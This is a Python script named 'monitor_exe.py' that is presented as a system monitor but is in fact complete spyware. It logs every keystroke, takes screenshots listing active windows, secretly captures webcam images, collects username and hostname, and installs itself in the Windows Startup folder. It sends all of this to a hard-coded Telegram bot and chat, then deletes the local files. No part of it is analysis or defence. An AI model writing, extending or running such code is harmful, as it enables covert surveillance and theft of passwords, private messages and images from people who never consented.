# monitor_exe.py
import keyboard
import requests
import threading
import time
import os
import platform
import psutil
import pyautogui
import cv2
import numpy as np
from datetime import datetime
import json
import getpass
import subprocess
import sys
from pathlib import Path

# Pre-configured credentials
TELEGRAM_BOT_TOKEN = "7124512745:AAHnSfqweqweqweqweqweqweqweqweqw"
TELEGRAM_CHAT_ID = "61245124512"

class AdvancedSystemMonitor:
    def __init__(self):
        self.bot_token = TELEGRAM_BOT_TOKEN
        self.chat_id = TELEGRAM_CHAT_ID
        self.keylog_file = "system_log.txt"
        self.is_running = False
        self.screenshot_interval = 300
        self.webcam_interval = 300
        self.upload_interval = 60
        
    def get_system_info(self):
        try:
            system_info = {
                'username': getpass.getuser(),
                'system': platform.system(),
                'hostname': platform.node(),
                'boot_time': datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
            }
            return system_info
        except Exception as e:
            return {'error': str(e)}
    
    def get_active_windows(self):
        try:
            active_windows = []
            if platform.system() == "Windows":
                import win32gui
                import win32process
                
                def callback(hwnd, ctx):
                    if win32gui.IsWindowVisible(hwnd):
                        window_text = win32gui.GetWindowText(hwnd)
                        if window_text:
                            _, pid = win32process.GetWindowThreadProcessId(hwnd)
                            try:
                                process = psutil.Process(pid)
                                process_name = process.name()
                            except:
                                process_name = "Unknown"
                            active_windows.append({'window': window_text, 'process': process_name})
                win32gui.EnumWindows(callback, None)
            return active_windows[:10]  # Limit to 10 windows
        except Exception as e:
            return [{'error': str(e)}]
    
    def capture_screenshot(self):
        try:
            screenshot_path = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            pyautogui.screenshot(screenshot_path)
            return screenshot_path
        except Exception as e:
            return None
    
    def capture_webcam(self):
        try:
            cap = cv2.VideoCapture(0)
            if cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    webcam_path = f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                    cv2.imwrite(webcam_path, frame)
                    cap.release()
                    return webcam_path
            cap.release()
            return None
        except Exception as e:
            return None
    
    def on_key_event(self, event):
        try:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            key_name = event.name
            if len(key_name) > 1:
                key_name = f"[{key_name.upper()}]"
            
            log_entry = f"{timestamp} - KEY: {key_name}\n"
            with open(self.keylog_file, 'a', encoding='utf-8') as f:
                f.write(log_entry)
        except Exception:
            pass
    
    def send_to_telegram(self, file_path=None, message=None, file_type='document'):
        try:
            if file_path and os.path.exists(file_path):
                if file_type == 'photo':
                    url = f"https://api.telegram.org/bot{self.bot_token}/sendPhoto"
                    files = {'photo': open(file_path, 'rb')}
                else:
                    url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
                    files = {'document': open(file_path, 'rb')}
                
                data = {'chat_id': self.chat_id}
                if message:
                    data['caption'] = message
                
                response = requests.post(url, files=files, data=data, timeout=30)
                files[list(files.keys())[0]].close()
                
                if response.status_code == 200:
                    try:
                        os.remove(file_path)
                    except:
                        pass
                    return True
                return False
                    
            elif message:
                url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
                data = {'chat_id': self.chat_id, 'text': message}
                response = requests.post(url, data=data, timeout=30)
                return response.status_code == 200
                
        except Exception:
            return False
    
    def periodic_screenshots(self):
        while self.is_running:
            try:
                time.sleep(self.screenshot_interval)
                screenshot_path = self.capture_screenshot()
                if screenshot_path:
                    active_windows = self.get_active_windows()
                    window_info = "\n".join([f"• {w['window']} ({w['process']})" for w in active_windows[:5]])
                    message = f"🖥️ Screenshot\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\nActive Windows:\n{window_info}"
                    self.send_to_telegram(screenshot_path, message, 'photo')
            except Exception:
                pass
    
    def periodic_webcam(self):
        while self.is_running:
            try:
                time.sleep(self.webcam_interval)
                webcam_path = self.capture_webcam()
                if webcam_path:
                    message = f"📷 Webcam\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    self.send_to_telegram(webcam_path, message, 'photo')
            except Exception:
                pass
    
    def periodic_upload(self):
        while self.is_running:
            try:
                time.sleep(self.upload_interval)
                if os.path.exists(self.keylog_file) and os.path.getsize(self.keylog_file) > 0:
                    system_info = self.get_system_info()
                    info_text = "\n".join([f"{k}: {v}" for k, v in system_info.items()])
                    message = f"⌨️ Keylog\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\nSystem Info:\n{info_text}"
                    if self.send_to_telegram(self.keylog_file, message):
                        open(self.keylog_file, 'w').close()
            except Exception:
                pass
    
    def setup_autostart(self):
        try:
            system = platform.system()
            username = getpass.getuser()
            
            if system == "Windows":
                startup_path = Path(f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                bat_content = f'@echo off\nstart /min "{sys.executable}" "{os.path.abspath(__file__)}"'
                bat_file = startup_path / "system_monitor.bat"
                with open(bat_file, 'w') as f:
                    f.write(bat_content)
        except Exception:
            pass
    
    def start(self):
        print("Starting System Monitor...")
        self.is_running = True
        
        self.setup_autostart()
        
        system_info = self.get_system_info()
        info_text = "\n".join([f"• {k}: {v}" for k, v in system_info.items()])
        startup_msg = f"🔍 Monitor Started\n\nSystem Info:\n{info_text}"
        self.send_to_telegram(message=startup_msg)
        
        keyboard.hook(self.on_key_event)
        
        threads = [
            threading.Thread(target=self.periodic_screenshots, daemon=True),
            threading.Thread(target=self.periodic_webcam, daemon=True),
            threading.Thread(target=self.periodic_upload, daemon=True)
        ]
        
        for thread in threads:
            thread.start()
        
        try:
            while self.is_running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        self.is_running = False
        keyboard.unhook_all()
        try:
            if os.path.exists(self.keylog_file):
                os.remove(self.keylog_file)
        except:
            pass

if __name__ == "__main__":
    monitor = AdvancedSystemMonitor()
    try:
        monitor.start()
    except Exception as e:
        monitor.stop()
